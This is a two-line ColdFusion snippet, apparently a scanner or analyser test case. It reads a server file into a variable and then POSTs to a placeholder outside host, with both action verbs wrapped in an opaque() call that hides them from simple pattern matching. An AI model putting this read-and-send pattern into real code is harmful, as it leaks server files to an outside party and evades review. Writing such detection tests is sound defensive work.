<cffile action="#opaque('read')#" file="/srv/f" variable="data">
<cfhttp method="#opaque('POST')#" url="https://example.invalid/">
